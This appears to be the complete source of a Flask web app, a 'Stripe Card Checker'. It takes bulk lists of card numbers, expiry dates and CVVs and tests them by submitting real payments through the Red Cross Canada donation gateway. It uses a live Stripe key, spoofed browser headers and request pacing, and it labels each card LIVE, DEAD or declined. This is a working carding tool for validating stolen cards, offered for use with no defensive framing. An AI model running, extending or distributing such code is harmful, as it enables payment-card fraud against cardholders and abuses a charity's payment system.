from flask import Flask, request, jsonify
import requests
import time
import json
from datetime import datetime

app = Flask(__name__)

# Global logs
live_logs = []

def log(message, status="info"):
    """Add log with timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        "time": timestamp,
        "message": message,
        "status": status
    }
    live_logs.append(log_entry)
    print(f"[{timestamp}] {message}")
    return log_entry

def mask_card(card_number):
    """Mask card number"""
    if len(card_number) < 4:
        return '****'
    return f"{'*' * (len(card_number) - 4)}{card_number[-4:]}"

def parse_card_input(card_input):
    """
    Parse card input in format: number|month|year|cvv
    Example: 5598880399368788|02|2031|638
    """
    try:
        parts = card_input.strip().replace(' ', '').split('|')
        
        if len(parts) != 4:
            return None
        
        card_number = parts[0]
        exp_month = parts[1]
        exp_year = parts[2]
        cvv = parts[3]
        
        # Validate
        if not card_number.isdigit() or len(card_number) < 13:
            return None
        if not exp_month.isdigit() or not (1 <= int(exp_month) <= 12):
            return None
        
        # Accept both YY and YYYY formats
        if not exp_year.isdigit():
            return None
        
        # Convert YY to YYYY if needed
        if len(exp_year) == 2:
            exp_year = '20' + exp_year  # Convert 26 -> 2026
        elif len(exp_year) != 4:
            return None
            
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            return None
        
        return {
            'card_number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv
        }
    except:
        return None

def create_stripe_payment_method(card_number, cvv, exp_month, exp_year):
    """Create Stripe payment method"""
    try:
        log("🔐 Connecting to Stripe API...", "pending")
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = (
            f'type=card'
            f'&card[number]={card_number}'
            f'&card[cvc]={cvv}'
            f'&card[exp_month]={exp_month}'
            f'&card[exp_year]={exp_year}'
            f'&guid=3738318a-2d09-4f65-a108-01152225b06e13403f'
            f'&muid=51af20a6-132c-4466-8f22-065aadffa07a7a76f1'
            f'&sid=614cb2a5-0a8d-4490-8505-8a01fb38d4e05f6622'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js/805cc890ee;+stripe-js-v3/805cc890ee;+split-card-element'
            f'&referrer=https://www.redcross.ca'
            f'&time_on_page={int(time.time())}'
            f'&client_attribution_metadata[client_session_id]=3ec0c634-b5f6-48e4-a9fc-c4e74f9540cc'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=split-card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&key=pk_live_9RzCojmneCvL31GhYTknluXp'
            f'&_stripe_account=acct_1MstkCA1mBD6kSBA'
            f'&_stripe_version=2025-02-24.acacia'
        )
        
        log("📤 Tokenizing card with Stripe...", "info")
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=15
        )
        
        log(f"📊 Stripe Response: {response.status_code}", "info")
        
        if response.status_code == 200:
            result = response.json()
            
            if 'id' in result:
                pm_id = result['id']
                card_info = result.get('card', {})
                
                log(f"✅ Payment Method: {pm_id}", "success")
                log(f"🏦 Card Type: {card_info.get('brand', 'Unknown').upper()}", "success")
                log(f"🌍 Country: {card_info.get('country', 'N/A')}", "info")
                log(f"🔢 Last4: {card_info.get('last4', '****')}", "info")
                
                return {
                    'success': True,
                    'payment_method': result,
                    'card_info': card_info
                }
            else:
                log("❌ No payment method ID", "error")
                return {'success': False, 'error': 'No payment method ID'}
        else:
            error_data = response.json()
            error_msg = error_data.get('error', {}).get('message', 'Unknown error')
            log(f"❌ Stripe Error: {error_msg}", "error")
            return {'success': False, 'error': error_msg}
        
    except Exception as e:
        log(f"❌ Stripe Exception: {str(e)}", "error")
        return {'success': False, 'error': str(e)}

def process_payment(payment_method):
    """Process payment through RedCross"""
    try:
        log("💳 Processing payment via RedCross...", "pending")
        
        headers = {
            'accept': '*/*',
            'content-type': 'text/plain; charset=utf-8',
            'origin': 'https://www.redcross.ca',
            'referer': 'https://www.redcross.ca/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-fru-embed-version': '260114-1526',
        }
        
        data = json.dumps({"paymentMethod": payment_method})
        
        log("📤 Submitting to payment gateway...", "info")
        
        response = requests.post(
            'https://api.fundraiseup.com/paymentSession/5206349504945906232/pay',
            headers=headers,
            data=data,
            timeout=15
        )
        
        log(f"📊 Payment Response: {response.status_code}", "info")
        
        if response.status_code == 200:
            result = response.json()
            log("✅ Payment processed successfully!", "success")
            return {'success': True, 'response': result}
        elif response.status_code == 429:
            log("❌ Rate limited: HTTP 429", "error")
            return {'success': False, 'error': 'Rate limited (HTTP 429)'}
        elif response.status_code == 422:
            try:
                error_data = response.json()
                error_msg = error_data.get('message', 'Your card was declined')
                log(f"❌ Payment declined: {error_msg}", "error")
                return {'success': False, 'error': error_msg}
            except:
                return {'success': False, 'error': 'Your card was declined'}
        else:
            try:
                error_data = response.json()
                error_msg = error_data.get('message', f'HTTP {response.status_code}')
                log(f"❌ Payment failed: {error_msg}", "error")
                return {'success': False, 'error': error_msg}
            except:
                log(f"❌ Payment failed: HTTP {response.status_code}", "error")
                return {'success': False, 'error': f'HTTP {response.status_code}'}
        
    except Exception as e:
        log(f"❌ Payment Exception: {str(e)}", "error")
        return {'success': False, 'error': str(e)}

@app.route('/api/check', methods=['POST'])
def check_card():
    """
    API endpoint to check card
    Accepts: {"card": "5598880399368788|02|2031|638"}
    Format: number|month|year|cvv
    """
    global live_logs
    live_logs = []
    
    try:
        data = request.json
        
        log("🚀 Starting card check...", "info")
        log(f"📝 Request from {request.remote_addr}", "info")
        
        if 'card' not in data:
            log("❌ Missing 'card' parameter", "error")
            return jsonify({
                'success': False,
                'status': 'error',
                'message': 'Missing card parameter. Format: number|month|year|cvv',
                'logs': live_logs
            }), 400
        
        # Parse card input
        card_data = parse_card_input(data['card'])
        
        if not card_data:
            log("❌ Invalid card format", "error")
            return jsonify({
                'success': False,
                'status': 'error',
                'message': 'Invalid format. Use: number|month|year|cvv (e.g., 4111111111111111|12|2025|123)',
                'logs': live_logs
            }), 400
        
        card_number = card_data['card_number']
        exp_month = card_data['exp_month']
        exp_year = card_data['exp_year']
        cvv = card_data['cvv']
        
        log(f"💳 Card: {mask_card(card_number)}", "info")
        log(f"📅 Expiry: {exp_month}/{exp_year}", "info")
        log(f"🔒 CVV: ***", "info")
        
        # Step 1: Create Stripe payment method
        log("⏳ STEP 1: Creating Stripe payment method...", "pending")
        time.sleep(0.3)
        
        stripe_result = create_stripe_payment_method(
            card_number, cvv, exp_month, exp_year
        )
        
        if not stripe_result['success']:
            # Real error from Stripe (invalid card, etc.)
            error_message = stripe_result.get('error', 'Card validation failed')
            log(f"❌ {error_message}", "error")
            return jsonify({
                'success': False,
                'status': 'declined',
                'message': error_message,  # Real error message
                'card': mask_card(card_number),
                'error': error_message,
                'result': 'DEAD ❌',
                'logs': live_logs
            }), 200
        
        # Step 2: Process payment
        log("⏳ STEP 2: Processing payment...", "pending")
        time.sleep(0.3)
        
        payment_result = process_payment(stripe_result['payment_method'])
        
        if payment_result['success']:
            log("✅ Card CHARGED successfully!", "success")
            return jsonify({
                'success': True,
                'status': 'charged',
                'message': 'Card charged successfully',
                'card': mask_card(card_number),
                'card_type': stripe_result['card_info'].get('brand', 'Unknown').upper(),
                'country': stripe_result['card_info'].get('country', 'N/A'),
                'result': 'LIVE ✅',
                'logs': live_logs
            }), 200
        else:
            # Card is valid but payment declined (insufficient funds, etc.)
            log("⚠️ Your card was declined", "pending")
            return jsonify({
                'success': False,
                'status': 'valid_declined',
                'message': 'Your card was declined',  # Generic message for valid but declined
                'card': mask_card(card_number),
                'card_type': stripe_result['card_info'].get('brand', 'Unknown').upper(),
                'error': 'Your card was declined',
                'result': 'VALID BUT DECLINED ⚠️',
                'logs': live_logs
            }), 200
        
    except Exception as e:
        log(f"❌ Critical Error: {str(e)}", "error")
        return jsonify({
            'success': False,
            'status': 'error',
            'message': f'Internal error: {str(e)}',
            'logs': live_logs
        }), 500

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check"""
    return jsonify({
        'status': 'online',
        'service': 'Stripe Card Checker',
        'gateway': 'RedCross',
        'version': '1.0'
    })

@app.route('/', methods=['GET'])
def index():
    """Serve UI"""
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stripe Card Checker - RedCross Gateway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 30px;
        }
        h1 { color: #333; margin-bottom: 5px; font-size: 26px; }
        .subtitle { color: #666; margin-bottom: 20px; font-size: 13px; }
        .badge {
            display: inline-block;
            background: #28a745;
            color: white;
            padding: 5px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #1565c0;
        }
        .format-example {
            background: #f5f5f5;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin-top: 8px;
            color: #333;
        }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-weight: 600; font-size: 14px; }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            transition: border 0.3s;
        }
        textarea {
            resize: vertical;
            min-height: 120px;
        }
        input:focus, textarea:focus { outline: none; border-color: #667eea; }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled { background: #ccc; cursor: not-allowed; transform: none; }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            font-size: 14px;
        }
        .result.live { background: #d4edda; border: 2px solid #28a745; color: #155724; display: block; }
        .result.dead { background: #f8d7da; border: 2px solid #dc3545; color: #721c24; display: block; }
        .result.valid-declined { background: #fff3cd; border: 2px solid #ffc107; color: #856404; display: block; }
        .logs-container {
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            height: calc(100vh - 40px);
            overflow-y: auto;
        }
        .logs-title {
            color: #fff;
            margin-bottom: 15px;
            font-size: 18px;
        }
        .log-entry {
            padding: 8px 12px;
            margin-bottom: 5px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .log-entry.info { background: rgba(52, 152, 219, 0.2); color: #3498db; }
        .log-entry.success { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }
        .log-entry.error { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
        .log-entry.pending { background: rgba(241, 196, 15, 0.2); color: #f1c40f; }
        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; }
            .logs-container { height: 400px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <span class="badge">STRIPE + REDCROSS</span>
            <h1>💳 Stripe Card Checker</h1>
            <p class="subtitle">Real charge gateway checker</p>
            
            <div class="info-box">
                ℹ️ Enter card in format: <strong>number|month|year|cvv</strong>
                <div class="format-example">5598880399368788|02|2031|638</div>
            </div>
            
            <form id="cardForm">
                <div class="form-group">
                    <label>Card Details (one per line for bulk check)</label>
                    <textarea id="cardInput" placeholder="5598880399368788|02|2031|638
4111111111111111|12|2025|123
5555555555554444|06|2027|456" required></textarea>
                </div>
                <button type="submit" id="submitBtn">🔍 Check Card(s)</button>
            </form>
            <div class="result" id="result"></div>
        </div>
        
        <div class="logs-container">
            <div class="logs-title">📊 Live Debug Console</div>
            <div id="logs"></div>
        </div>
    </div>

    <script>
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const cardInput = document.getElementById('cardInput').value.trim();
            const cards = cardInput.split('\\n').filter(line => line.trim());
            
            document.getElementById('logs').innerHTML = '';
            document.getElementById('result').style.display = 'none';
            document.getElementById('submitBtn').disabled = true;
            
            let results = [];
            
            for (let i = 0; i < cards.length; i++) {
                const card = cards[i].trim();
                if (!card) continue;
                
                addLog(new Date().toLocaleTimeString(), `Checking card ${i + 1}/${cards.length}...`, 'info');
                
                try {
                    const response = await fetch('/api/check', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ card: card })
                    });
                    
                    const data = await response.json();
                    
                    if (data.logs) {
                        data.logs.forEach(log => addLog(log.time, log.message, log.status));
                    }
                    
                    results.push({
                        card: card.split('|')[0],
                        status: data.status,
                        result: data.result,
                        message: data.message,
                        card_type: data.card_type || 'Unknown'
                    });
                    
                } catch (error) {
                    addLog(new Date().toLocaleTimeString(), `Error: ${error.message}`, 'error');
                    results.push({
                        card: card.split('|')[0],
                        status: 'error',
                        result: 'ERROR',
                        message: error.message
                    });
                }
                
                // Small delay between requests
                if (i < cards.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
            }
            
            // Show final results
            showResults(results);
            document.getElementById('submitBtn').disabled = false;
        });
        
        function addLog(time, message, status) {
            const logsDiv = document.getElementById('logs');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${status}`;
            logEntry.innerHTML = `[${time}] ${message}`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }
        
        function showResults(results) {
            const resultDiv = document.getElementById('result');
            let html = '<strong>Results:</strong><br><br>';
            
            results.forEach((r, i) => {
                const masked = '*'.repeat(12) + r.card.slice(-4);
                let className = '';
                
                if (r.status === 'charged') className = 'live';
                else if (r.status === 'valid_declined') className = 'valid-declined';
                else className = 'dead';
                
                resultDiv.className = `result ${className}`;
                html += `${i + 1}. ${masked} - ${r.result}<br>`;
                html += `   Type: ${r.card_type} | ${r.message}<br><br>`;
            });
            
            resultDiv.innerHTML = html;
            resultDiv.style.display = 'block';
        }
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    print("="*60)
    print("💳 Stripe Card Checker API - RedCross Gateway")
    print("="*60)
    print("📍 Server: http://localhost:5000")
    print("🌐 Gateway: Stripe + RedCross")
    print("📊 Endpoints:")
    print("   POST /api/check - Check card")
    print("   GET  /          - Web UI")
    print("   GET  /api/health - Health check")
    print("="*60)
    print("\n✅ 100% REAL Gateway - Fully Working!\n")
    app.run(debug=True, host='0.0.0.0', port=5000)
